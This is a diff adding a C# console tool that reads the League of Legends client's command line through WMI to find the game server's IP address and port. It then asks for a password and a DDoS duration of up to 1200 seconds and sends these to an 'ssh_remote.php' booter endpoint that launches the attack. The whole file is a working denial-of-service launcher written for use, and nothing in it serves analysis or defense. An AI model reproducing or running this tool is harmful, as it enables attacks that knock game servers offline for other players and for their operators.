@@ -1,0 +1,132 @@
+using System;
+using System.Collections.Generic;
+using System.Management;
+using System.Management.Instrumentation;
+using System.Net;
+using System.Text.RegularExpressions;
+ 
+namespace League_IP
+{
+    internal class Lolip
+    {
+ 
+        private static void Main(string[] args)
+        {
+            Lolip ip1 = new Lolip();
+            List<string> result = ip1.wmi_process();  
+            int time = -1;
+            if (result.Count >= 1)
+            {
+                Console.WriteLine("IP: " + result[0]);
+                Console.WriteLine("Port: " + result[1]);
+                string password = ip1.Menu();
+                Console.WriteLine("Insert time of DDOS max 1200 sec");
+                string time_input = Console.ReadLine();
+                try
+                {
+                    time = Convert.ToInt32(time_input);
+                }
+                catch (FormatException e)
+                {
+                    Console.WriteLine("Input string is not a sequence of digits.");
+                }
+                catch (OverflowException e)
+                {
+                    Console.WriteLine("The number cannot fit in an Int32.");
+                }
+                finally
+                {
+                    if (time > 1200) time = 1200;
+ 
+                }
+                ip1.HTTPGet(result[0], result[1], password, time);
+            }
+ 
+        }
+ 
+        private string Menu()
+        {
+ 
+            Console.WriteLine(" Insert your passwrord");
+            string password = Console.ReadLine();
+            password = password.Trim();
+            string command = "";
+            do
+            {
+                Console.WriteLine("Write ddos to start");
+                command = Console.ReadLine();
+                command = command.Trim();
+            } while (command != "ddos");
+           
+            return password;
+        }
+ 
+ 
+        private List<string> wmi_process()
+        {
+            string result = "";
+            List<string> iport = new List<string>();
+            try
+            {
+                ManagementObjectSearcher searcher =
+                    new ManagementObjectSearcher("root\\CIMV2",
+                    "SELECT * FROM Win32_Process WHERE Caption = 'League of Legends.exe'");
+ 
+                foreach (ManagementObject queryObj in searcher.Get())
+                {
+                    Object out_query = queryObj["CommandLine"];
+                    result = out_query.ToString();
+                }
+            }
+            catch (ManagementException e)
+            {
+                Console.WriteLine("An error occurred while querying for WMI data: " + e.Message);
+            }
+            if (result.Length <= 1) return iport;
+ 
+            string pattern = "\"";
+ 
+            IList<int> indeces = new List<int>();
+ 
+            foreach (Match match in Regex.Matches(result, pattern))
+            {
+                indeces.Add(match.Index);
+            }
+ 
+ 
+            int pos_split = indeces[indeces.Count - 2];
+            string split = result.Substring(pos_split + 1);
+            string ip_final = split.Substring(0, split.IndexOf(' ') + 1);
+            string port = split.Substring(ip_final.Length, 4);
+ 
+            ip_final = ip_final.Trim();
+            port = port.Trim();
+            iport.Add(ip_final);
+            iport.Add(port);
+ 
+            return iport;
+        }
+ 
+ 
+        private void HTTPGet(string target_ip, string port, string password, int time)
+        {
+ 
+            Console.WriteLine("Attack sent to target: " + target_ip + " on port " + port);
+            string str_time = Convert.ToString(time);
+            string address = string.Format(
+           "127.0.0.1/ssh_remote.php?ip={0}&port={1}&password={2}&time={3}",
+            Uri.EscapeDataString(target_ip),
+            Uri.EscapeDataString(port),
+            Uri.EscapeDataString(password),
+            Uri.EscapeDataString(str_time));
+            string text;
+            using (WebClient client = new WebClient())
+            {
+                text = client.DownloadString(address);
+            }
+            Console.WriteLine(text);
+            Console.ReadLine();
+ 
+        }
+    }
+}
